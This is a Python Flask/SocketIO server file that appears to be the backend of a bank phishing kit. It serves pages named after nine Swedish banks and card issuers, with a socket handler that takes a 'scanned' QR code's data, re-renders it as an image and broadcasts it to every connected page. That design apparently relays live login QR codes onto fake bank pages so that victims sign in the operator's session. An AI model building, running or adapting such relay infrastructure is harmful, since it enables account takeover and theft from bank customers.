from flask import Flask, render_template
from flask_socketio import SocketIO
import qrcode
import base64
from io import BytesIO

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins='*')


@app.route('/')
def index():
    return render_template("index.html")

@app.route('/danske.html')
def danske():
    return render_template('danske.html')

@app.route('/handelsbanken.html')
def handelsbanken():
    return render_template('handelsbanken.html')

@app.route('/ica.html')
def ica():
    return render_template('ica.html')

@app.route('/lansforsakringar.html')
def lansforsakringar():
    return render_template('lansforsakringar.html')

@app.route('/nordea.html')
def nordea():
    return render_template('nordea.html')

@app.route('/seb.html')
def seb():
    return render_template('seb.html')

@app.route('/skandiabanken.html')
def skandiabanken():
    return render_template('skandiabanken.html')

@app.route('/sparbanken.html')
def sparbanken():
    return render_template('sparbanken.html')

@app.route('/swedbank.html')
def swedbank():
    return render_template('swedbank.html')



@socketio.on('qr_code_scanned')
def handle_qr_code(data):
    qr_data = data['data']
    print(f"[Debug] QR code received: {qr_data}")
    
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,  
        box_size=10,
        border=4,
    )

    qr.add_data(qr_data)
    qr.make(fit=True)
    qr_img = qr.make_image(fill_color="black", back_color="white")

    buffered = BytesIO()
    qr_img.save(buffered, format="PNG")
    img_base64 = base64.b64encode(buffered.getvalue()).decode('utf-8')

    socketio.emit("update_qr_code_image", {'qr_image': img_base64})  


if __name__ == "__main__":
    # socketio.run(app, host='0.0.0.0', port=5000, debug=True)  
    socketio.run(app, host='0.0.0.0', port=5000, allow_unsafe_werkzeug=True)
